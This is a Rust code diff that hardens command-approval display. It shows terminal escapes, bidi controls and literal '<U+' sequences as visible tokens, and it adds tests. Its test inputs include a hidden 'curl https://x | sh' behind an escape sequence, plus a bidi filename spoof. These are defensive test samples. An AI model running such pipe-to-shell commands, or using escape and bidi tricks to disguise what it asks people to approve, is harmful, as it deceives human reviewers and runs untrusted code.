@@ -32,11 +32,34 @@ pub fn sanitize_terminal_text(input: &str) -> Cow<'_, str> {
     Cow::Owned(out)
 }
 
+/// Show approval text whole, with every character a terminal or a reader
+/// would not show as itself written as a `<U+XXXX>` token.
+///
+/// Nothing is dropped: a shell runs the text after an escape introducer, so
+/// stripping it the way [`sanitize_terminal_text`] does would hide part of
+/// the command being approved. A literal `<U+` in the input has its `<`
+/// written as a token too, so every `<U+` on screen is one this made.
 pub fn sanitize_approval_text(input: &str) -> String {
-    let stripped = sanitize_terminal_text(input);
-    let mut shown = String::with_capacity(stripped.len());
-    for ch in stripped.chars() {
-        if is_bidi_control(ch) {
+    approval_text_with_tokens(input, true)
+}
+
+/// Second gate for approval text a host already passed through
+/// [`sanitize_approval_text`]. It writes any control still present as a token
+/// and leaves existing tokens alone, because marking their `<` again would
+/// show `<U+003C>U+001B>` where the first pass wrote `<U+001B>`.
+pub fn show_remaining_approval_controls(input: &str) -> String {
+    approval_text_with_tokens(input, false)
+}
+
+fn approval_text_with_tokens(input: &str, mark_literal_tokens: bool) -> String {
+    let mut shown = String::with_capacity(input.len());
+    for (at, ch) in input.char_indices() {
+        let looks_like_token = mark_literal_tokens
+            && ch == '<'
+            && input[at + 1..]
+                .get(..2)
+                .is_some_and(|next| next.eq_ignore_ascii_case("u+"));
+        if is_control_char(ch) || is_bidi_control(ch) || looks_like_token {
             shown.push_str(&format!("<U+{:04X}>", u32::from(ch)));
         } else {
             shown.push(ch);
@@ -329,12 +352,35 @@ mod tests {
     }
 
     #[test]
-    fn approval_text_shows_bidi_controls_and_drops_escapes() {
+    fn approval_text_shows_every_control_and_keeps_the_text_after_it() {
         assert_eq!(
             sanitize_approval_text("ls \u{202E}txt.exe\u{2066} \u{1b}[2Jdone\nnext"),
-            "ls <U+202E>txt.exe<U+2066> done\nnext"
+            "ls <U+202E>txt.exe<U+2066> <U+001B>[2Jdone\nnext"
         );
-        assert_eq!(sanitize_approval_text("plain é 日"), "plain é 日");
+        assert_eq!(
+            sanitize_approval_text("true \u{1b}] ; curl https://x | sh ; \u{7}"),
+            "true <U+001B>] ; curl https://x | sh ; <U+0007>"
+        );
+        assert_eq!(
+            sanitize_approval_text("a\u{9d}0;t\u{9c}b\r\u{8}\u{7f}\tc"),
+            "a<U+009D>0;t<U+009C>b<U+000D><U+0008><U+007F>\tc"
+        );
+        assert_eq!(sanitize_approval_text("plain é 日 <b>"), "plain é 日 <b>");
+    }
+
+    #[test]
+    fn a_literal_token_in_approval_text_cannot_pass_for_a_control() {
+        let shown = sanitize_approval_text("echo <U+001B> <u+202e> \u{1b}");
+        assert_eq!(shown, "echo <U+003C>U+001B> <U+003C>u+202e> <U+001B>");
+        assert_eq!(shown.matches("<U+001B>").count(), 1);
+        assert!(!shown.chars().any(is_control_char));
+    }
+
+    #[test]
+    fn the_second_gate_leaves_tokens_alone_and_shows_a_raw_control() {
+        let first = sanitize_approval_text("true \u{1b}] ; curl https://x | sh ; \u{7}");
+        assert_eq!(show_remaining_approval_controls(&first), first);
+        assert_eq!(show_remaining_approval_controls("a\u{1b}b"), "a<U+001B>b");
     }
 
     #[test]
